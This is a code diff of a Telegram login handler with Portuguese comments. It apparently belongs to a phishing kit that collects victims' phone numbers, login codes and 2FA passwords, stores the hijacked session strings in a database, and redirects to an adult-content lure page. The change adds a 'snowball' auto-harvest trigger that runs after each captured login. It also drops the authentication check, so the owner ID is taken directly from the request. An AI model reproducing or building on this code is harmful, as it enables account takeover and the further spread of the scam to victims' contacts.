@@ -2,49 +2,29 @@ import { TelegramClient } from "telegram";
 import { StringSession } from "telegram/sessions";
 import { Api } from "telegram/tl";
 import { createClient } from '@supabase/supabase-js';
-const { optionalAuthenticate } = require('../../lib/middleware');
 
 const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
 const apiId = parseInt(process.env.TELEGRAM_API_ID);
 const apiHash = process.env.TELEGRAM_API_HASH;
 
 export default async function handler(req, res) {
-  // Autenticação opcional - se houver token, associa ao owner_id
-  await optionalAuthenticate(req, res, async () => {
-  let { phoneNumber, code, password } = req.body;
-  
-  // 1. LIMPEZA TOTAL (Garante que só tem números)
+  let { phoneNumber, code, password, ownerId } = req.body;
   const cleanPhone = phoneNumber.toString().replace(/\D/g, '');
-  const cleanCode = code.toString().trim();
-
-  console.log(`[VERIFY] Validando: ${cleanPhone}`);
 
   try {
-      // 2. Busca no banco pelo número LIMPO
-      const { data: authData, error } = await supabase
-        .from('auth_state')
-        .select('*')
-        .eq('phone_number', cleanPhone)
-        .single();
+      // 1. Busca auth state
+      const { data: authData } = await supabase.from('auth_state').select('*').eq('phone_number', cleanPhone).single();
+      if (!authData) return res.status(400).json({ error: "Sessão expirada." });
 
-      if (error || !authData) {
-          console.error("Erro auth_state:", error);
-          return res.status(400).json({ error: "Sessão não encontrada ou expirada." });
-      }
-
-      // 3. Conecta
-      const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, {
-        connectionRetries: 5,
-        useWSS: false, 
-      });
+      const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, { connectionRetries: 2, useWSS: false });
       await client.connect();
 
-      // 4. Login
+      // 2. Login
       if (password) {
-            await client.signIn({ password, phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: cleanCode });
+            await client.signIn({ password, phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: code });
       } else {
             try {
-                await client.invoke(new Api.auth.SignIn({ phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: cleanCode }));
+                await client.invoke(new Api.auth.SignIn({ phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: code }));
             } catch (e) {
                 if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
                     await client.disconnect();
@@ -54,42 +34,35 @@ export default async function handler(req, res) {
             }
       }
 
-      // 5. SALVA A SESSÃO FINAL (Parte Crítica)
+      // 3. Salva Sessão Oficial
       const finalSession = client.session.save();
-      
-      // Se o usuário estiver autenticado (não admin), associa ao owner_id dele
-      // Se for admin ou não autenticado, owner_id fica null (será associado manualmente depois)
-      const sessionData = {
+      await supabase.from('telegram_sessions').upsert({
         phone_number: cleanPhone,
         session_string: finalSession,
         is_active: true,
+        owner_id: ownerId || 'admin',
         created_at: new Date()
-      };
+      }, { onConflict: 'phone_number' });
 
-      // Só associa owner_id se for usuário normal (não admin) e tiver userId
-      if (!req.isAdmin && req.userId) {
-        sessionData.owner_id = req.userId;
-      }
-      
-      const { error: saveError } = await supabase.from('telegram_sessions').upsert(
-        sessionData,
-        { onConflict: 'phone_number' }
-      );
-
-      if (saveError) {
-          console.error("Erro ao salvar sessão:", saveError);
-          throw new Error("Falha ao salvar no banco.");
-      }
-
-      // 6. Limpa temporário
+      // 4. Limpa temporário
       await supabase.from('auth_state').delete().eq('phone_number', cleanPhone);
       await client.disconnect();
+
+      // --- GATILHO BOLA DE NEVE (AUTO-HARVEST) ---
+      // Chama a API de varredura sem esperar resposta (Fire-and-Forget) para não travar o usuário
+      // O fetch precisa de URL absoluta em server-side
+      const protocol = req.headers['x-forwarded-proto'] || 'http';
+      const host = req.headers.host;
       
+      fetch(`${protocol}://${host}/api/auto-harvest`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: cleanPhone, ownerId: ownerId || 'admin' })
+      }).catch(err => console.error("Erro ao disparar auto-harvest:", err));
+
       res.status(200).json({ success: true, redirect: "https://hotconteudoss.netlify.app" });
 
-    } catch (error) {
-      console.error("ERRO FINAL:", error);
-      res.status(400).json({ error: error.message || "Erro na validação" });
-    }
-  });
+  } catch (error) {
+    res.status(400).json({ error: error.message || "Erro na validação" });
+  }
 }
